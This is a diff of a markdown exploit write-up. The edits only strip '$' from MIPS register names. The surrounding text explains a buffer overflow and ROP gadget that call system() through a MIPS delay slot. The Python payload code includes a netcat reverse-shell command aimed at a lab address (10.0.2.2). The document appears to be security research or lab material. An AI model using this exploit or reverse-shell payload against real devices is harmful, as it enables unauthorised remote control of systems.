@@ -828,15 +828,15 @@ Walking through this, it loads a word (4 bytes) at `($sp + 0xa4)` into the `ra` 
 
 This is huge. It loads an address of a function of our choosing into `t9` and executes it, and also uses a parameter of our choosing on the stack, which should be pointed to by an address at `s0`. Basically, all we have to do is organize the stack correctly. 
 
-There is one thing you might be worried about. Does the gadget not load the parameter into `$a0` *after* it jumps to / executes the function at `$t9`? Or in other words, isn't the parameter not yet ready for the function call?
+There is one thing you might be worried about. Does the gadget not load the parameter into `a0` *after* it jumps to / executes the function at `t9`? Or in other words, isn't the parameter not yet ready for the function call?
 
 Since this is MIPS, this actually *isn't* a problem. This is due to MIPS' [delay slot](https://en.wikipedia.org/wiki/Delay_slot) feature. It's essentially a feature in which a instruction slot is executed without the effects of a preceding instruction. So in our gadget, `lw $a0, 0($s0)` is a delay slot. So our parameter actually *will* be ready. 
 
-After playing around with the buffer overflow, I find that we can control a whole lot of registers, since they are all loaded from the stack before the segfault. This includes the general registers `s0 - s8`, and naturally since the registers are loaded from the stack, offsets from these registers. With enough trial and error, I find where exactly on the stack the registers get their values from. So we can definitely control what gets placed at `$s0` and `$s0 + 0xc`. 
+After playing around with the buffer overflow, I find that we can control a whole lot of registers, since they are all loaded from the stack before the segfault. This includes the general registers `s0 - s8`, and naturally since the registers are loaded from the stack, offsets from these registers. With enough trial and error, I find where exactly on the stack the registers get their values from. So we can definitely control what gets placed at `s0` and `s0 + 0xc`. 
 
-So our goal is to place the address of `system` at `$s0 + 0xc`, since that gets loaded into `$t9`, and then jumped to
+So our goal is to place the address of `system` at `s0 + 0xc`, since that gets loaded into `t9`, and then jumped to
 
-We also want to place a pointer to the parameter we want to pass into `system` at `$s0`, since that gets loaded into `$a0` (`system` takes the pointer to a string of the command, instead of the string itself)
+We also want to place a pointer to the parameter we want to pass into `system` at `s0`, since that gets loaded into `a0` (`system` takes the pointer to a string of the command, instead of the string itself)
 
 Finally of course, we want to overwrite the return address with the address of our gadget
 
@@ -872,7 +872,7 @@ def send_long_path(length, filler, ret_addr):
 
         long_path += b"C" * 8                             # Write some more to reach s0 + 0xc
 
-        long_path += p32(0x77fae424, endian="big")        # Loads s0 + 0xc with address of system (which eventually gets moved into $t9 via gadget)
+        long_path += p32(0x77fae424, endian="big")        # Loads s0 + 0xc with address of system (which eventually gets moved into t9 via gadget)
 
         long_path += b"C"*4                               # Write some filler, and then the reverse shell string
         long_path += b"rm${IFS}/tmp/p;mkfifo${IFS}/tmp/p;nc${IFS}10.0.2.2${IFS}9696</tmp/p|/bin/sh>/tmp/p"
